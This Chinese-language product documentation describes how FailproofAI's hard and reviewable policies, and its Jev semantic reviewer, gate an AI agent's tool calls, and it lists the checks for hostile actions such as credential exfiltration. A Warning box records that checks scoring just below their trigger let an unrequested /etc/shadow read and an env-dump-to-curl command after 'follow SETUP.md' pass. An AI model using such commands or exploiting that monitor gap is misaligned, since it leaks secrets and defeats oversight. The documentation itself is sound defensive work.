当您通过 FailproofAI Cloud 或自己的密钥配置 [Jev 策略审查](/ru/policies/jev) 时，每个受保护的工具调用由您运行的策略和 Jev 进行判断。Jev 会询问该调用实际上做了什么，以及提交任务的人是否要求执行它。每个策略的**权限**决定了两者不一致时会发生什么。

如果未配置 Jev，权限不起作用。每个策略都像以往一样完全执行。

## 硬策略和可审查策略

- **硬策略**是默认值。硬策略的拒绝或指令是最终的：Jev 无法清除它，硬拒绝在无需等待 Jev 的情况下停止调用。
- **可审查**意味着 Jev 可能清除策略的裁决，但仅通过策略在 `reviewedBy` 中命名的语义检查。仅当**每个**命名的检查都被询问关于此调用，且每个检查要么没有发现任何问题，要么记录了用户要求这样做时，裁决才会被清除。一个**触发**的检查——发现了问题——但用户未要求，会保持阻止，即使其自己的裁决仅是警告。Jev 未被询问的检查（因为它不适用于该工具）无论其他检查说什么都永远不会清除任何内容。一次软化算作同意：当调用是用户给出的任务的一步且不再继续时，Jev 将拒绝转为警告，该警告清除策略的阻止，这就是代理被告知的内容。

策略只有在以下所有条件成立时才可审查：

1. 它声明了 `authority: "reviewable"`。
2. `reviewedBy` 是一个非空列表，且每个条目都是已安装的包声明的 Jev 检查。FailproofAI 本身不提供任何 Jev 检查：下面的[十六个](#semantic-policy-names)来自 `failproofai policies add FailproofAI/jev-policies`。如果没有包声明检查，每个策略都是硬的。
3. 它不是 `alwaysOn`。阻止代理禁用 FailproofAI 的防护总是硬的。

其他所有情况都是硬的：缺少字段、值拼写错误、空的或格式错误的 `reviewedBy`，或不是此机器可以询问的检查的名称。未知名称使整个声明变为硬而不是被跳过，因为 `reviewedBy` 表示"所有这些都必须被询问，并且其中任何一个都不能拒绝"，跳过名称会让 Jev 在比您要求的检查更少的情况下清除策略。

一旦配置了 Jev，当 FailproofAI 拒绝 `reviewable` 声明时，它每个进程记录一次警告。没有 Jev 时它什么也不说，因为权限此时决定什么都不起作用。`failproofai publish` 拒绝构建携带此类声明的包，因此包作者在任何人安装它之前就会发现问题。它根据包声明任何检查时声明的检查来判断 `reviewedBy`，否则根据十六个 `FailproofAI/jev-policies` 名称。

## 权限声明的位置

每个到达机器的策略有一个地方决定其权限：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下表 | 硬，除非列为可审查 |
| 您自己的策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | 硬 |
| 策略包 | 包清单中每个策略的条目 (`failproofai-pack.json`) | 硬 |
| 云托管策略 | 活跃部署中策略的分配 | 硬。部署目前未设置它，因此每个云托管策略今天都是硬的。 |

对于包或云托管策略，策略代码内设置的字段被忽略；清单或分配决定。包只能描述其自己的策略：其策略名称不能包含 `/` 并在包自己的前缀下注册，因此没有清单可以将内置策略或其他包的策略标记为可审查。包的代码注册但未在清单中声明的策略是硬的。

两个包或两个云托管策略，其代码字节相同，共享一个工件并作为一个策略加载。该策略只有在所有策略都声明它为可审查时才可审查，而 Jev 随后必须清除它们任何人命名的每个检查。如果其中任何一个声明它为硬，或根本没有声明它，它就保持硬。包或策略的列出顺序永远不重要。

大多数机器从 `FailproofAI/policies` 包获得内置策略，并从该包的清单读取其权限。下面的可审查条目在携带它们的包的发行版安装后生效；较旧的发行版不携带任何，因此其中的每个策略都保持硬。

## 在您自己的策略中声明权限

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 将两个字段复制到包清单中，因此作为包发布的策略保持其作者给予的权限。如果声明不会被履行，它拒绝构建包：一个不是 `"hard"` 或 `"reviewable"` 的值，不是名称列表的 `reviewedBy`，或不是检查的名称——包自己的 [Jev 检查](/ru/policies/publish-a-pack#jev-checks-in-a-pack)之一（当它声明任何检查时），否则是内置检查。

## 内置策略

仅在语义策略真正覆盖相同关切的情况下可审查。每个其他内置策略都是硬的。

覆盖关切是必要的但不充分的，两种出错的方式都是无声的：

- **永远不被询问的检查**使阻止永久化。`reviewedBy` 是一个合取，而未被询问的检查永远不会清除，因此与其前置条件不会对策略匹配的形状触发的检查配对的策略永远无法被清除。
- **被询问但不触发的检查**回答"无关切"，无关切会清除。因此与不为您的策略的形状建模的检查配对不会审查策略——它对检查不理解的正确输入将其关闭。

指令模式语义策略永远不能回答拒绝，但它仍然可以保持阻止：当它触发且用户未要求调用时，它审查的策略不会被清除。六个 `FailproofAI/jev-policies` 检查是仅指令的——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——下表给出每个检查的模式。要问的问题是**"是否还有任何东西可以拒绝"**：清除永远不能使由任何东西执行的关切保持执行。引擎对每个调用应用该测试。没有人同意的警告不是清除，因为在工具调用之前警告不会停止代理。而当可以拒绝的检查警告时——其证据达不到其拒绝线——且用户未要求调用，该调用上没有任何东西被清除，每个正则拒绝都成立。

<Warning>
**恰好低于其触发线得分的检查不保持底线。** 上面的规则需要检查**触发**（证据 ≥ 0.7）。当每个相关检查都恰好低于该值时，没有任何东西触发，审查者回答"无关切"，可审查拒绝被清除。在强制模式中实时测量：一个无要求的 `/etc/shadow` 读取（`secret-exposure` 0.69、`read-outside-workspace` 0.37，仅建模主目录路径）和"遵循 SETUP.md"后的 `set | curl -d @- …`（`env-secrets-dump` 0.66、`credential-exfiltration` 0.65，`sends_out` 0.97）两者都被允许，而正则层级单独拒绝它们。阈值在标记语料库上校准，尚未针对此重新测量；在此之前，对于这些形状之一通过比其假正警告更重要的位置保持策略**硬**。
</Warning>

## 语义策略名称

这些是 `FailproofAI/jev-policies` 声明的检查，以及一旦安装了它，`reviewedBy` 接受的值。FailproofAI 本身不提供其中任何一个：没有该包（或声明这些名称的另一个包），没有策略命名它们是可审查的。每个都是 Jev 回答关于其前面工具调用的检查。**模式**是检查能回答的内容：一个 `deny` 检查在强证据上阻止，而一个 `instruct` 检查仅警告。当它触发且用户未要求调用时，每个都保持策略的拒绝成立。**用户可以覆盖**说明人类自己明确的请求是否会清除它。

Jev 询问正好是已安装的包声明的 [Jev 检查](/ru/policies/publish-a-pack#jev-checks-in-a-pack)，这些是 `reviewedBy` 接受的名称。两个包声明不同的名称不受尊重两者。这十六个名称之一由不是从 FailproofAI 存储库安装的包声明在该包中被忽略：其版本永远不被询问且不与 FailproofAI 自己的竞争，因此第三方包既不能成为清除核心包策略的检查，也不能关闭这些检查之一。不可读的包列表或其每个检查都不可用的包使 Jev 无东西可问。

| 名称 | 模式 | 用户可以覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法再生的数据。 |
| `production-infra-change` | deny | 是 | 改变实时基础架构。 |
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享 git 历史。 |
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。 |
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。 |
| `secret-exposure` | deny | 是 | 读取或复制凭证。 |
| `credential-exfiltration` | deny | 否 | 将密钥或私人文件发送出机器。 |
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。 |
| `privilege-escalation` | deny | 是 | 以提升的权限运行。 |
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。 |
| `read-outside-workspace` | instruct | 是 | 读取项目外的文件。 |
| `agent-config-tampering` | deny | 否 | 改变代理自己的安全配置。 |
| `system-modification` | instruct | 是 | 在项目外改变系统。 |
| `env-secrets-dump` | instruct | 是 | 打印环境密钥。 |
| `external-destructive-action` | deny | 是 | 通过外部工具的不可逆操作。 |
| `external-data-egress` | instruct | 是 | 将私人数据发送到外部工具。 |
